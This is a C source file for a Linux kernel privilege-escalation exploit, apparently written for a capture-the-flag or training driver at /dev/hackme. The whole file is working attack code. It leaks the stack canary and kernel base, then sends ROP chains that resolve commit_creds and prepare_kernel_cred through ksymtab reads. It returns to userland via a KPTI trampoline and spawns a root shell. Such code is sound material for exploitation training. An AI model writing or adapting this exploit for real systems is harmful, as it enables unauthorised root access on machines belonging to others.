#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/xattr.h>
#include <unistd.h>

typedef unsigned long ul;

#define DEV_PATH "/dev/hackme"

int dev;

void bak() {
  __asm__ volatile(
      ".intel_syntax noprefix;"
      "mov bak_cs, cs;"
      "mov bak_ss, ss;"
      "mov bak_rsp, rsp;"
      "pushf;"
      "pop bak_rflags;"
      ".att_syntax;");
  puts("[+] Registers backed up");
}

void bin_sh() {
  printf("[+] uid: %d\n", getuid());
  system("/bin/sh");
}

/* Backup registers */
ul bak_cs, bak_rflags, bak_ss, bak_rsp, bak_rip;
ul cookie;
ul bak_rip = (ul)bin_sh;

/* Helper functions */
void debug() {
  puts("[+] Halted execution");
  getchar();
}

void print_dump(ul* data, int len) {
  for (size_t i = 0; i < len; i++) {
    printf("%zu: 0x%lx\n", i, data[i]);
  }
}

void open_dev() {
  dev = open(DEV_PATH, O_RDWR);
  puts("[+] Interacting with device");
}

void err(const char* str) { fprintf(stderr, "[-] %s\n", str); }

#define CANARY_OFF 16
ul kernel_base;

ul prepare_kernel_cred;
ul commit_creds;
ul creds_struct_ret;
ul kpti_trampoline = 0x200f10 + 22;
// ul pop_rdi = 0x38a0;          // pop rdi ; pop rbp ; ret
ul pop_rdi = 0x6370;          // pop rdi ; ret
ul pop_rax = 0x4d11;          // pop rax ; ret
ul read_rax_0x10 = 0x004aae;  // mov eax, dword ptr [rax + 0x10] ; pop rbp ; ret
ul ksymtab_prepare_kernel_cred = 0xf8d4fc;
ul ksymtab_commit_creds = 0xf87d90;

void leak() {
  ul buf[50];
  read(dev, buf, sizeof(buf));
  cookie = buf[CANARY_OFF];
  kernel_base = buf[38] - 0xa157;

  printf("[+] kernel_base: %p\n", (void*)kernel_base);
  // print_dump(buf, sizeof(buf));
}

void call_commit_creds() {
  printf("[!] last payload\n");
  ul payload[50];
  off_t offset = 16;
  payload[offset++] = cookie;
  payload[offset++] = 0x0;  // rbx
  payload[offset++] = 0x0;  // r12
  payload[offset++] = 0x0;  // rbp
  payload[offset++] = kernel_base + pop_rdi;
  payload[offset++] = creds_struct_ret;  // rdi
  // payload[offset++] = 0;                 // dummy
  payload[offset++] = commit_creds;
  payload[offset++] = kernel_base + kpti_trampoline;
  payload[offset++] = 0;           // dummy
  payload[offset++] = 0;           // dummy
  payload[offset++] = (ul)bin_sh;  // ret userland
  payload[offset++] = bak_cs;
  payload[offset++] = bak_rflags;
  payload[offset++] = bak_rsp;
  payload[offset++] = bak_ss;

  ssize_t w = write(dev, payload, sizeof(payload));
  if (w == -1) {
    perror("leak_prepare_kernel_cred");
  }
}

ul tmp_leak;
void __call_prepare_kernel_cred() {
  __asm__(
      ".intel_syntax noprefix;"
      "mov tmp_leak, rax;"
      ".att_syntax;");
  creds_struct_ret = tmp_leak;
  printf("[+] creds_struct_ret: %p\n", (void*)creds_struct_ret);
  call_commit_creds();
}

void call_prepare_kernel_cred() {
  ul payload[50];
  off_t offset = 16;
  payload[offset++] = cookie;
  payload[offset++] = 0x0;  // rbx
  payload[offset++] = 0x0;  // r12
  payload[offset++] = 0x0;  // rbp
  payload[offset++] = kernel_base + pop_rdi;
  payload[offset++] = 0;
  // payload[offset++] = 0;
  payload[offset++] = prepare_kernel_cred;
  payload[offset++] = kernel_base + kpti_trampoline;
  payload[offset++] = 0;                               // dummy
  payload[offset++] = 0;                               // dummy
  payload[offset++] = (ul)__call_prepare_kernel_cred;  // ret userland
  payload[offset++] = bak_cs;
  payload[offset++] = bak_rflags;
  payload[offset++] = bak_rsp;
  payload[offset++] = bak_ss;

  ssize_t w = write(dev, payload, sizeof(payload));
  if (w == -1) {
    perror("leak_prepare_kernel_cred");
  }
}

void __leak_prepare_kernel_cred() {
  __asm__(
      ".intel_syntax noprefix;"
      "mov tmp_leak, rax;"
      ".att_syntax;");
  prepare_kernel_cred =
      kernel_base + ksymtab_prepare_kernel_cred + (int)tmp_leak;
  printf("[+] prepare_kernel_cred: %p\n", (void*)prepare_kernel_cred);
  call_prepare_kernel_cred();
}

void leak_prepare_kernel_cred() {
  ul payload[50];
  off_t offset = 16;
  payload[offset++] = cookie;
  payload[offset++] = 0x0;  // rbx
  payload[offset++] = 0x0;  // r12
  payload[offset++] = 0x0;  // rbp
  payload[offset++] = kernel_base + pop_rax;
  payload[offset++] = kernel_base + ksymtab_prepare_kernel_cred - 0x10;
  payload[offset++] = kernel_base + read_rax_0x10;
  payload[offset++] = 0;  // dummy
  payload[offset++] = kernel_base + kpti_trampoline;
  payload[offset++] = 0;                               // dummy
  payload[offset++] = 0;                               // dummy
  payload[offset++] = (ul)__leak_prepare_kernel_cred;  // ret userland
  payload[offset++] = bak_cs;
  payload[offset++] = bak_rflags;
  payload[offset++] = bak_rsp;
  payload[offset++] = bak_ss;

  ssize_t w = write(dev, payload, sizeof(payload));
  if (w == -1) {
    perror("leak_prepare_kernel_cred");
  }
}

void __leak_commit_creds() {
  __asm__(
      ".intel_syntax noprefix;"
      "mov tmp_leak, rax;"
      ".att_syntax;");
  commit_creds = kernel_base + ksymtab_commit_creds + (int)tmp_leak;
  printf("[+] commit_creds: %p\n", (void*)commit_creds);
  leak_prepare_kernel_cred();
}

void leak_commit_creds() {
  ul payload[50];
  off_t offset = 16;
  payload[offset++] = cookie;
  payload[offset++] = 0x0;  // rbx
  payload[offset++] = 0x0;  // r12
  payload[offset++] = 0x0;  // rbp
  payload[offset++] = kernel_base + pop_rax;
  payload[offset++] = kernel_base + ksymtab_commit_creds - 0x10;
  payload[offset++] = kernel_base + read_rax_0x10;
  payload[offset++] = 0;  // dummy
  payload[offset++] = kernel_base + kpti_trampoline;
  payload[offset++] = 0;                        // dummy
  payload[offset++] = 0;                        // dummy
  payload[offset++] = (ul)__leak_commit_creds;  // ret userland
  payload[offset++] = bak_cs;
  payload[offset++] = bak_rflags;
  payload[offset++] = bak_rsp;
  payload[offset++] = bak_ss;

  ssize_t w = write(dev, payload, sizeof(payload));
  if (w == -1) {
    perror("leak_commit_creds");
  }
}

/* Exploit */
int main() {
  bak();

  open_dev();
  leak();
  leak_commit_creds();
  return 0;
}